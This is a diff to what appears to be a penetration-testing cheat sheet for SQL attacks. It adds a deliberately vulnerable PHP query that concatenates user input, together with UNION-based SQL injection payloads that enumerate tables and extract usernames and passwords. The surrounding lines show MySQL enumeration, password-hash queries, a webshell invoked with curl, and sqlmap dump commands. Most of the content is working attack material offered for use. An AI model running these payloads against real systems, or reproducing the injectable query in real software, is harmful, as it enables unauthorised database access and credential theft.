@@ -47,12 +47,30 @@ $ mysql -u root -p'rootpassword' -h $DbServerIp -P $DbServerPort
 > use databasetohack;
 > select table_name from information_schema.tables;
 > select table_name, table_schema from information_schema.tables where table_schema = 'databasetohack';
+> select table_name, table_schema from information_schema.tables where table_schema = database(); # current db in use
 > select column_name from information_schema.columns where table_name = 'tablenamewithusers' ;
 
 > SELECT user, authentication_string, plugin FROM mysql.user WHERE user = 'usertohack';
 ```
 
 ### Attacks
+
+#### Union select
+
+Vulnerable Php query:
+```
+$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
+```
+
+Injection:
+```
+' order by 1,2,3 -- //
+' union select database(), user(), @@version, null, null -- //
+' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+' union select null, username, password, description, null from users -- //
+```
+
+#### Php injection
 
 Php injection in an `input` HTML field:
 ```
@@ -65,6 +83,8 @@ curl $TargetIp/path/on/target/webshell.php?cmd=ls
 
 ## Sqlmap
 
+https://sqlmap.org/
+ 
 ```
 sqlmap -u http://ip/page.php?user=dummy -p user
 sqlmap -u http://ip/page.php?user=dummy -p user --dump
